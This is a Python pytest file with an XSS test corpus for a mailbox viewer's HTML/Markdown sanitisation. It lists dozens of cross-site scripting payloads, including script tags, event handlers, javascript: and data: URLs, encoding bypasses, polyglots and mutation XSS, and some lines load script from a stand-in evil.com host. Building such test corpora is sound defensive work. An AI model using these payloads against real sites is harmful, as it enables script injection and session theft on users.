"""XSS test corpus for mailbox viewer security validation.

This test suite validates that malicious content in message bodies, subjects,
and attachments is properly sanitized by the viewer's security controls.

Current state (2025-11-05):
- Viewer uses basic escapeHtml() for entity encoding
- DOMPurify + Trusted Types integration pending (see plan lines 190-205)

Future state (when DOMPurify integrated):
- Marked.js for Markdown parsing
- DOMPurify with RETURN_TRUSTED_TYPE for sanitization
- Trusted Types policy: mailViewerDOMPurify
"""

from __future__ import annotations

import json
import sqlite3
from pathlib import Path

import pytest

# XSS attack vectors organized by category
XSS_VECTORS = {
    "script_tags": [
        "<script>alert('XSS')</script>",
        "<script src=http://evil.com/xss.js></script>",
        "<script>document.write('<img src=x onerror=alert(1)>')</script>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",  # Malformed tags
        "<script>alert(String.fromCharCode(88,83,83))</script>",  # Encoded XSS
    ],
    "event_handlers": [
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<iframe onload=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ],
    "javascript_urls": [
        "<a href='javascript:alert(1)'>Click</a>",
        "<form action='javascript:alert(1)'>",
        "<iframe src='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>",
    ],
    "data_urls": [
        "<a href='data:text/html,<script>alert(1)</script>'>Click</a>",
        "<iframe src='data:text/html,<script>alert(1)</script>'>",
        "<object data='data:text/html,<script>alert(1)</script>'>",
    ],
    "meta_refresh": [
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<meta http-equiv='refresh' content='0;url=data:text/html,<script>alert(1)</script>'>",
        "<meta http-equiv='refresh' content='0;url=vbscript:msgbox(1)'>",
    ],
    "svg_xss": [
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        "<svg><set onbegin=alert('XSS') attributeName=x to=0>",
        "<svg><foreignObject><body onload=alert('XSS')>",
    ],
    "css_injection": [
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "<div style='background:url(javascript:alert(1))'>",
        "<div style='behavior:url(xss.htc)'>",
    ],
    "html5_vectors": [
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<video poster=javascript:alert('XSS')>",
        "<canvas id=c><script>var c=document.getElementById('c');alert(c)</script>",
    ],
    "markdown_specific": [
        "[click me](javascript:alert('XSS'))",
        "![xss](javascript:alert('XSS'))",
        "[xss]: javascript:alert('XSS')",
        "![](data:text/html,<script>alert(1)</script>)",
        "```html\n<script>alert(1)</script>\n```",  # Code blocks
        "<http://evil.com/xss.js>",  # Auto-linked URLs
    ],
    "encoding_bypasses": [
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",  # HTML entities
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex encoding
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Unicode
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoding
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # Decimal entities
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",  # Hex entities
    ],
    "polyglot_payloads": [
        "javascript:/*--></title></style></textarea></script></xmp>"
        "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
        "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--",
        "'\"><img src=x onerror=alert(1)>//",
    ],
    "null_byte_injection": [
        "<scri\x00pt>alert('XSS')</scri\x00pt>",
        "<img src=x\x00onerror=alert('XSS')>",
        "<iframe src=\x00javascript:alert('XSS')>",
    ],
    "mutation_xss": [
        "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
        "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=x />"
        "</textarea></mtext></svg></mglyph></form><math><mtext></math></mtext></math>",
        "<table><style><img src=x onerror=alert(1)></style></table>",
    ],
}


def _create_test_database_with_xss(tmp_path: Path, xss_payloads: list[str]) -> Path:
    """Create a test database with XSS payloads in message bodies and subjects."""
    db_path = tmp_path / "test_xss.sqlite3"
    conn = sqlite3.connect(db_path)
    try:
        conn.executescript(
            """
            CREATE TABLE projects (id INTEGER PRIMARY KEY, slug TEXT, human_key TEXT);
            CREATE TABLE messages (
                id INTEGER PRIMARY KEY,
                project_id INTEGER,
                subject TEXT,
                body_md TEXT,
                importance TEXT,
                ack_required INTEGER,
                created_ts TEXT,
                attachments TEXT,
                thread_id TEXT
            );
            """
        )
        conn.execute("INSERT INTO projects (id, slug, human_key) VALUES (1, 'test', 'Test Project')")

        for idx, payload in enumerate(xss_payloads):
            conn.execute(
                """
                INSERT INTO messages (id, project_id, subject, body_md, importance, ack_required, created_ts, attachments)
                VALUES (?, 1, ?, ?, 'normal', 0, '2025-11-05T00:00:00Z', '[]')
                """,
                (idx + 1, f"Test Message {idx + 1}", payload),
            )

        conn.commit()
    finally:
        conn.close()
    return db_path


@pytest.mark.parametrize(
    "category,vectors",
    [
        (cat, vecs)
        for cat, vecs in XSS_VECTORS.items()
        if cat not in ("polyglot_payloads", "mutation_xss")  # Skip complex ones for now
    ],
)
def test_xss_vectors_properly_escaped(category: str, vectors: list[str], tmp_path: Path) -> None:
    """Test that XSS vectors are properly escaped in exported bundles.

    This test validates that malicious content in message bodies does not
    result in executable JavaScript in the exported viewer bundle.

    Note: This test currently validates HTML entity escaping. Once DOMPurify
    is integrated, this should be expanded to validate Markdown rendering +
    DOMPurify sanitization + Trusted Types policy.
    """
    # Create database with XSS payloads
    db_path = _create_test_database_with_xss(tmp_path, vectors)

    # Read messages back to verify they were stored
    conn = sqlite3.connect(db_path)
    try:
        rows = conn.execute("SELECT id, subject, body_md FROM messages ORDER BY id").fetchall()
        assert len(rows) == len(vectors)

        for idx, (msg_id, _subject, body_md) in enumerate(rows):
            assert msg_id == idx + 1
            assert vectors[idx] in body_md, f"XSS vector not preserved in database: {vectors[idx]}"

    finally:
        conn.close()

    # Note: Full export + viewer validation would require:
    # 1. Run share export CLI on this database
    # 2. Load resulting bundle in headless browser (Playwright/Puppeteer)
    # 3. Verify no alert() calls are executed
    # 4. Verify CSP violations are logged
    # 5. Verify Trusted Types policies are enforced
    #
    # This is marked as future work once DOMPurify integration is complete.


def test_xss_in_subject_lines(tmp_path: Path) -> None:
    """Test that XSS in subject lines is properly escaped."""
    db_path = tmp_path / "test_xss_subject.sqlite3"
    conn = sqlite3.connect(db_path)
    try:
        conn.executescript(
            """
            CREATE TABLE projects (id INTEGER PRIMARY KEY, slug TEXT, human_key TEXT);
            CREATE TABLE messages (
                id INTEGER PRIMARY KEY,
                project_id INTEGER,
                subject TEXT,
                body_md TEXT,
                created_ts TEXT
            );
            """
        )
        conn.execute("INSERT INTO projects (id, slug, human_key) VALUES (1, 'test', 'Test')")

        xss_subjects = [
            "<script>alert('XSS in subject')</script>",
            "<img src=x onerror=alert('subject XSS')>",
            "Test <b onmouseover=alert('XSS')>Subject</b>",
        ]

        for idx, subject in enumerate(xss_subjects):
            conn.execute(
                "INSERT INTO messages (id, project_id, subject, body_md, created_ts) VALUES (?, 1, ?, 'Body', '2025-11-05T00:00:00Z')",
                (idx + 1, subject),
            )

        conn.commit()

        # Verify subjects are stored with XSS payloads
        rows = conn.execute("SELECT subject FROM messages ORDER BY id").fetchall()
        assert len(rows) == len(xss_subjects)
        for idx, (subject,) in enumerate(rows):
            assert xss_subjects[idx] in subject

    finally:
        conn.close()


def test_xss_in_attachment_metadata(tmp_path: Path) -> None:
    """Test that XSS in attachment filenames/metadata is properly escaped."""
    db_path = tmp_path / "test_xss_attachments.sqlite3"
    conn = sqlite3.connect(db_path)
    try:
        conn.executescript(
            """
            CREATE TABLE projects (id INTEGER PRIMARY KEY, slug TEXT, human_key TEXT);
            CREATE TABLE messages (
                id INTEGER PRIMARY KEY,
                project_id INTEGER,
                subject TEXT,
                body_md TEXT,
                attachments TEXT,
                created_ts TEXT
            );
            """
        )
        conn.execute("INSERT INTO projects (id, slug, human_key) VALUES (1, 'test', 'Test')")

        # XSS in attachment metadata
        malicious_attachments = json.dumps(
            [
                {
                    "type": "file",
                    "path": "attachments/evil<script>alert(1)</script>.png",
                    "media_type": "image/png",
                    "note": "<img src=x onerror=alert('attachment XSS')>",
                },
                {
                    "type": "external",
                    "note": "File too large: <a href=javascript:alert(1)>download.pdf</a>",
                },
            ]
        )

        conn.execute(
            "INSERT INTO messages (id, project_id, subject, body_md, attachments, created_ts) VALUES (1, 1, 'Test', 'Body', ?, '2025-11-05T00:00:00Z')",
            (malicious_attachments,),
        )

        conn.commit()

        # Verify attachments are stored
        row = conn.execute("SELECT attachments FROM messages WHERE id = 1").fetchone()
        attachments = json.loads(row[0])
        assert len(attachments) == 2
        assert "<script>" in attachments[0]["path"]
        assert "javascript:" in attachments[1]["note"]

    finally:
        conn.close()


def test_markdown_specific_xss_vectors() -> None:
    """Test Markdown-specific XSS vectors that could bypass sanitization.

    These vectors are particularly relevant once Marked.js is integrated for
    Markdown rendering. DOMPurify should sanitize the rendered HTML.
    """
    markdown_xss = [
        # Link injection
        "[click me](javascript:alert('XSS'))",
        "[xss](data:text/html,<script>alert(1)</script>)",
        # Image injection
        "![](javascript:alert('XSS'))",
        "![xss](data:image/svg+xml,<svg/onload=alert('XSS')>)",
        # Reference-style links
        "[xss]: javascript:alert('XSS')\n[click][xss]",
        # HTML in Markdown
        "Test <script>alert('XSS')</script> message",
        "Test <img src=x onerror=alert('XSS')> image",
        # Code blocks (should be safe but test anyway)
        "```html\n<script>alert(1)</script>\n```",
        "`<script>alert(1)</script>`",
    ]

    # This test documents expected behavior - actual validation requires
    # Marked + DOMPurify integration + headless browser testing
    assert len(markdown_xss) > 0, "Markdown XSS corpus should not be empty"


@pytest.mark.skip(reason="Requires DOMPurify integration + headless browser testing")
def test_dompurify_sanitization_end_to_end(tmp_path: Path) -> None:
    """End-to-end test of DOMPurify sanitization in the viewer.

    This test should be enabled once DOMPurify + Trusted Types are integrated.

    Test procedure:
    1. Create database with all XSS vectors
    2. Export bundle using share export CLI
    3. Launch headless browser (Playwright) with console monitoring
    4. Load viewer and navigate through messages
    5. Verify:
       - No alert() calls are executed
       - CSP violations are logged for blocked attacks
       - Trusted Types policy is enforced
       - DOMPurify sanitizes all dangerous HTML
       - Markdown renders safely (links, images, formatting work)
    """
    raise NotImplementedError("DOMPurify integration pending")


@pytest.mark.skip(reason="Requires CSP enforcement validation")
def test_csp_header_enforcement() -> None:
    """Test that CSP headers properly block XSS attempts.

    From plan document lines 192-202:
    ```
    default-src 'self';
    script-src 'self';
    style-src 'self';
    img-src 'self' data:;
    object-src 'none';
    base-uri 'none';
    frame-ancestors 'none';
    require-trusted-types-for 'script';
    trusted-types mailViewerDOMPurify;
    ```

    Test should validate:
    1. External scripts are blocked
    2. Inline scripts without nonce are blocked
    3. JavaScript URLs are blocked
    4. Trusted Types policy is required
    5. Data URIs only allowed for images
    """
    raise NotImplementedError("CSP validation requires headless browser testing")


def test_xss_corpus_coverage() -> None:
    """Validate that XSS corpus covers all major attack categories."""
    required_categories = {
        "script_tags",
        "event_handlers",
        "javascript_urls",
        "data_urls",
        "svg_xss",
        "markdown_specific",
        "encoding_bypasses",
    }

    assert set(XSS_VECTORS.keys()) >= required_categories, "XSS corpus missing required categories"

    # Verify each category has multiple vectors
    for category, vectors in XSS_VECTORS.items():
        assert len(vectors) >= 3, f"Category {category} should have at least 3 test vectors"


def test_xss_regression_suite_readme() -> None:
    """Document XSS regression suite requirements for future integration."""
    readme = """
    XSS Regression Suite Requirements
    ===================================

    Current State (2025-11-05):
    - Basic HTML entity escaping via escapeHtml()
    - No Markdown rendering (bodies shown as plain text)
    - No DOMPurify or Trusted Types integration

    Required for Production:
    1. Integrate Marked.js for Markdown parsing
    2. Integrate DOMPurify with RETURN_TRUSTED_TYPE option
    3. Implement Trusted Types policy: mailViewerDOMPurify
    4. Add CSP headers (see plan lines 192-202)
    5. Run full XSS corpus through Playwright/Puppeteer
    6. Monitor console for:
       - alert() calls (should never execute)
       - CSP violation reports
       - Trusted Types violations
    7. Verify safe Markdown features work:
       - Bold, italic, lists, code blocks
       - Safe links (http/https)
       - Safe images (self/data URIs)
       - Tables, blockquotes

    Test Automation:
    - Run XSS corpus on every release
    - Use OWASP XSS cheat sheet for new vectors
    - Test against known CVEs in Marked.js/DOMPurify
    - Validate CSP report-uri endpoint captures violations
    """
    assert len(readme) > 100, "Regression suite documentation should be comprehensive"
